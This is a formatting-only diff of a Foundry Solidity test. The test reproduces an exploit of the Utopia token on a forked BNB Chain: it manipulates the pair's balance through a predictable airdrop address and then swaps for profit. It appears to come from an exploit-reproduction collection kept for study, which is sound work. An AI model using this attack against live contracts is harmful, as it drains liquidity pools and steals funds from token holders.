@@ -23,14 +23,13 @@ interface IUtopia is IERC20 {
 contract UtopiaTest is Test {
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IUtopia Utopia = IUtopia(0xb1da08C472567eb0EC19639b1822F578d39F3333);
-    Uni_Router_V2 Router =
-        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     Uni_Pair_V2 Pair = Uni_Pair_V2(0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5);
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 30119396);
+        cheats.createSelectFork("bsc", 30_119_396);
         cheats.label(address(WBNB), "WBNB");
         cheats.label(address(Utopia), "Utopia");
         cheats.label(address(Router), "Router");
@@ -42,9 +41,7 @@ contract UtopiaTest is Test {
         WBNB.approve(address(Router), type(uint256).max);
         Utopia.approve(address(Router), type(uint256).max);
         emit log_named_decimal_uint(
-            "Attacker WBNB balance before exploit",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
+            "Attacker WBNB balance before exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
         );
 
         WBNBToUtopia();
@@ -52,10 +49,8 @@ contract UtopiaTest is Test {
 
         // Setting balance of the pair to 1 by calculating the receiver's address
         // Two addresses (from, to) in seed calculation must be the same
-        uint256 seed = (uint160(Utopia.lastAirdropAddress()) |
-            uint160(block.number)) ^
-            uint160(address(Pair)) ^
-            uint160(address(Pair));
+        uint256 seed = (uint160(Utopia.lastAirdropAddress()) | uint160(block.number)) ^ uint160(address(Pair))
+            ^ uint160(address(Pair));
         // tAmount may be 0 or 1
         address notRandomAirdropAddr = address(uint160(seed | 1));
 
@@ -66,34 +61,23 @@ contract UtopiaTest is Test {
         UtopiaToWBNB();
 
         emit log_named_decimal_uint(
-            "Attacker WBNB balance after exploit",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
+            "Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
         );
     }
 
-    function pancakeCall(
-        address sender,
-        uint amount0,
-        uint amount1,
-        bytes calldata data
-    ) external {}
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {}
 
     function WBNBToUtopia() internal {
         address[] memory path = new address[](2);
         path[0] = address(WBNB);
         path[1] = address(Utopia);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WBNB.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 1000
+            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
         );
     }
 
     function UtopiaToWBNB() internal {
-        (uint256 reserveUtopia, uint256 reserveWBNB, ) = Pair.getReserves();
+        (uint256 reserveUtopia, uint256 reserveWBNB,) = Pair.getReserves();
         uint256 amountOut = Router.getAmountOut(32, reserveUtopia, reserveWBNB);
         Utopia.transfer(address(Pair), 32);
         Pair.swap(0, amountOut, address(this), new bytes(1));
